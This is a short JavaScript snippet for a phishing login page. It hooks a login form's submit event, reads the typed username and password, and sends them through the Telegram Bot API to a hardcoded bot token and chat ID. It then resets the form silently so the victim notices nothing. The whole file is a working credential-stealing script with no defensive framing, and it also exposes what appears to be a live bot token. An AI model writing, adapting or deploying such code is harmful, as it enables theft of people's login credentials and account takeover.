document.querySelector('.login-button').closest('form').addEventListener('submit', function(e) {
    e.preventDefault();

    // 1. Put your actual Telegram details here
    const BOT_TOKEN = '8827810558:AAHMgMCCghkPCwHduz0SMk9bppzOhypKtVI';
    const CHAT_ID = '5092429629';

    // 2. Grabs the values from your HTML inputs using their IDs
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // 3. Creates the message layout
    const text = `📩 New Entry\n👤 username: ${username}\n🎂 password: ${password}`;

    // 4. Sends it to Telegram
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text
})
    })
    .then(res => res.json())
    .then(data => {
        this.reset(); // Clears the form silently (no alerts)
    })
    .catch(err => console.error(err));
});
